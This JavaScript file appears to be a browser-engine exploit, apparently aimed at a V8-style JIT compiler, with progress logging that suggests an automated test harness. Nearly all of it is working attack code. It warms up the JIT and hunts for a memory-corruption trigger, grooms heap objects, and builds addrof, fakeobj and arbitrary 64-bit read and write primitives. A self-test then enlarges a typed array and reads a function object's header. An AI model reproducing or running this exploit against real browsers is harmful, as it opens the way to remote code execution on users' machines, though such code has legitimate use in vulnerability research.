(function () {
  var out = { step: [], exp: {}, guard: [], phase: 'start' };
  function guard(name, fn) {
    out.phase = name;
    try { fn(); out.step.push(name + ':ok'); return true; }
    catch (e) {
      var m = 'no message';
      try { m = String(e); } catch (e2) { m = 'unstringifiable'; }
      out.guard.push(name + ': ' + m);
      out.step.push(name + ':FAILED');
      aveStep('PHASE ' + name + ' FAILED: ' + m);
      return false;
    }
  }

  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };
  var OFF = 0x0002000000000000n;
  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);
  var BUDGET = 1200, t0 = Date.now(), rounds = 0;
  var arr, arr_index, W = null, HA, gap, changeArr, holder, scribble;

  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A; let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f; let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }

  guard('carrier', function () {
    arr = new Array(0x400000).fill(1.1);
    arr_index = arr.length - 1;
  });

  aveStep('init: carrier allocated, warming up the JIT (the one-time slow phase)');
  guard('warmup', function () {
    foo(true, 1, 1); foo(false, 1, 1);
    for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
    for (let i = 0; i < 10000; i++) rec(i);      // GC pressure; RangeError tolerated
  });
  out.exp.warmupMs = Date.now() - t0;
  aveStep('warmup done in ' + out.exp.warmupMs + 'ms, starting the trigger hunt');

  guard('hunt', function () {
    for (let k = 0; k < 10000 && !W; ++k) {
      rounds = k + 1;
      var kk = (k < 30) ? 10 : 2;
      foo(false, kk, k % 5 + 1);
      rec(2000);
      for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
      let fr = arr[arr_index].p1.p1;
      let noCow = 13.37;
      for (let i = 0; i < 16; ++i) {
        let c = [13.37, 2.2, 3.3, 4.4, noCow];
        if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
      }
      if (k % 25 === 24) aveStep('hunt round=' + rounds +
                                  ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
      if (Date.now() - t0 > BUDGET) { out.exp.budgetReached = true; break; }
    }
  });
  out.exp.rounds = rounds;
  out.exp.huntMs = Date.now() - t0;
  aveStep('hunt finished: rounds=' + rounds + ' in ' + out.exp.huntMs +
          'ms, trigger=' + (W ? 'FIRED at round ' + W.round : 'no'));

  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

  guard('groom', function () {
    if (!W) throw 'trigger did not fire';
    holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    HA = addrof(holder); var SA = addrof(scribble); gap = SA - HA;
    for (var t = 0; t < 40 && gap !== 0x40n && gap !== -0x40n; t++) {
      holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
      scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
      HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
    }
    out.gap = gap.toString();
    if (gap !== 0x40n && gap !== -0x40n) throw 'groom failed';
    out.step.push('groom ok, gap=' + gap);
  });

  guard('primitive', function () {
    if (gap !== 0x40n && gap !== -0x40n) throw 'no groomed pair';
    scribble.p7 = 3.3; scribble[0] = 1.1;
    holder.p1 = itof(HDR);
    holder.p2 = scribble;
    changeArr = fakeobj(HA - 1n + 0x10n + 1n);
    function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }
    function write64(addr, val) {
      setBtf(BigInt(addr));
      try { scribble.p7 = itof(BigInt.asUintN(64, BigInt(val))); return true; } catch (e) { return false; }
    }
    function read64(addr) {
      setBtf(BigInt(addr));
      try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
    }

    var t = new BigUint64Array(8);
    t[0] = 0x4142434445464748n;
    var w1 = write64(addrof(t) - 1n + 0x18n, 0x0000000000001000n);
    out.write = (w1 && t.length === 4096);
    out.read = (t[0] === 0x4142434445464748n);
    out.step.push('self-test: write=' + out.write + ' read=' + out.read);

    var fn = function myFunc() { return 1; };
    out.fnAddr = '0x' + addrof(fn).toString(16);
    var w0 = read64(addrof(fn) - 1n);
    out.fnWord = w0 === null ? null : '0x' + w0.toString(16);
    out.step.push('JSFunction header word=' + out.fnWord);
    out.ready = out.write && out.read;
  });

  aveStep('phases: ' + out.step.join(' | '));
  var answer = JSON.stringify(out);
  aveStep('RESULT ' + answer);
  return answer;
})()

